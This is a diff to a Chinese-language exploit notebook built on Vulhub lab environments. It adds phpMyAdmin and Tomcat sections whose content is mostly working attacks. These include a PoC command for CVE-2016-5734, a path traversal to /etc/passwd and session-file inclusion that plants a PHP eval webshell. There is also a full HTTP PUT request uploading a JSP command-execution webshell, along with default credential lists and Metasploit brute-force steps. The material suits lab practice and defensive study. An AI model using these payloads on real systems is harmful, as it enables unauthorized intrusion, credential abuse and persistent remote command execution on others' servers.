@@ -9,6 +9,8 @@
         - [ThinkPHP-5.0.23-Rce](#ThinkPHP-5.0.23-Rce)
         - [ThinkPHP-2.x-任意代码执行漏洞](#ThinkPHP-2.x-任意代码执行漏洞)
     - [phpmyadmin](#phpmyadmin)
+        - [CVE-2016-5734](#CVE-2016-5734)
+        - [CVE-2018-12613](#CVE-2018-12613)
 - [Python](#Python)
     - [Flask](#Flask)
         - [Jinja2](#Jinja2)
@@ -39,16 +41,21 @@
     - [1.2.24-rce](#1.2.24-rce)
     - [1.2.47-rce](#1.2.47-rce)
 
-- [log4j2](#log4j2)
-    - [CVE-2021-44228-log4j2-rce漏洞](#CVE-2021-44228-log4j2-rce漏洞)
+- [tomcat](#tomcat)
+    - [CVE-2017-12615](#CVE-2017-12615)
+    - [Tomcat8+弱口令+后台getshell漏洞](#Tomcat8+弱口令+后台getshell漏洞)
+
+- [Apache](#Apache)
+    - [log4j2](#log4j2)
+        - [CVE-2021-44228-log4j2-rce漏洞](#CVE-2021-44228-log4j2-rce漏洞)
 
 - [Grafana](#Grafana)
     - [Grafana插件模块目录穿越漏洞](#Grafana插件模块目录穿越漏洞)
 
 
-> 以下环境均来自Vulhub
-
-https://github.com/vulhub/vulhub
+- 参考文章
+    - https://github.com/vulhub/vulhub
+    - https://github.com/ffffffff0x/1earn/blob/c3ee45b00d55a142a63f81da9602a4c9ca75b14e/1earn/Security/RedTeam/Web%E5%AE%89%E5%85%A8/BS-Exploits.md#tomcat
 ## PHP
 
 ### XXE
@@ -108,6 +115,75 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D
 ```
 
+### phpmyadmin
+
+phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具
+
+phpMyAdmin的登录页面。默认口令：`root:root`
+
+![image](./img/phpmyadmin1.png)
+#### CVE-2016-5734
+
+> phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）
+
+在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。
+
+在PHP5.4.7以前，preg_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。
+
+影响版本：
+```
+4.0.10.16之前4.0.x版本
+4.4.15.7之前4.4.x版本
+4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）
+```
+
+因为目标环境使用root，所以我们可以创建一个临时数据库和数据表，进行漏洞利用。
+
+CVE-2016-5734.py(kali虚拟机下运行)
+- https://www.exploit-db.com/exploits/40185
+```
+python3 CVE-2016-5734.py -c 'system(id);' -u root -p root -d test http://node4.buuoj.cn:28303/
+```
+
+-d是已经可以写的数据库，-c是待执行的PHP语句，如果没有指定表名，这个POC会创建一个名为prgpwn的表。
+
+![image](./img/phpmyadmin2.png)
+
+#### CVE-2018-12613
+
+> phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）
+
+其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。
+
+```
+http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
+```
+
+**写入phpinfo**
+
+找SQL界面执行语句如下：
+
+`SELECT '<?php phpinfo()?>'`
+
+![image](./img/phpmyadmin3.png)
+
+http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_96f5e4daa240a56fb90cbd130ee33ef4
+
+sess为cookie中phpmyadmin的值
+
+![image](./img/phpmyadmin4.png)
+
+**写入shell**
+
+```
+SELECT `<?php fputs(fopen("a.php","w"),'<?php eval($_POST[a]);?>');?>`;
+```
+
+执行后会报错SQL查询错误，接着继续访问tmp sess文件，再去访问a.php
+
+![image](./img/phpmyadmin5.png)
+
+蚁剑添加，密码为a
 
 ## Python
 ### Flask
@@ -126,7 +202,6 @@ id:
 
 ### Django
 
-#### 
 
 ## Struts2
 
@@ -390,13 +465,93 @@ nc -lvnp 8888
 
 ![image](./img/fastjson3.png)
 
+## tomcat
+
+### CVE-2017-12615
+> Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）
+
+当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。
+
+影响版本：Apache Tomcat 7.0.0 ~ 7.0.81
+影响平台：Windows
+
+传一个webshell
+```
+PUT /shell.jsp/ HTTP/1.1
+Host: your-ip:8080
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
++"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>
+```
+
+/shell.jsp?cmd=whoami&pwd=023
+
+![image](./img/tomcat1.png)
+
+备注：我尝试了冰蝎，也是可以的
+
+其它payload：
+
+在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名
+```
+PUT /111.jsp::$DATA HTTP/1.1
+Host: 10.1.1.6:8080
+User-Agent: JNTASS
+DNT: 1
+Connection: close
+
+...jsp shell...
+```
+
+参考文章：
+- https://blog.csdn.net/qq_36241198/article/details/114883818
+
+### Tomcat8+弱口令+后台getshell漏洞
+
+Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。
+
+tomcat弱口令:（其它需要抓包爆破，可用xray爆破）
+```
+admin/admin
+tomcat/tomcat
+tomcat/admin
+admin/123456
+```
+
+**msf弱口令爆破**
+```
+use auxiliary/scanner/http/tomcat_mgr_login
+set rhosts 192.168.52.130
+set rport 8080
+run
+```
+
+![image](./img/tomcat2.png)
+
+上传由1.jsp压缩后的1.zip改为后缀的1.war包
+
+访问http://xxxx/1/1.jsp
+
+![image](./img/tomcat3.png)
 
 
-## Log4j2
+参考文章：
+- https://www.cnblogs.com/qianxinggz/p/13440366.html
+
+
+
+## Apache
+### Log4j2
 
 Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。。 在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。
 
-### CVE-2021-44228-log4j2-rce漏洞
+#### CVE-2021-44228-log4j2-rce漏洞
 
 Log4j2反弹shell
 
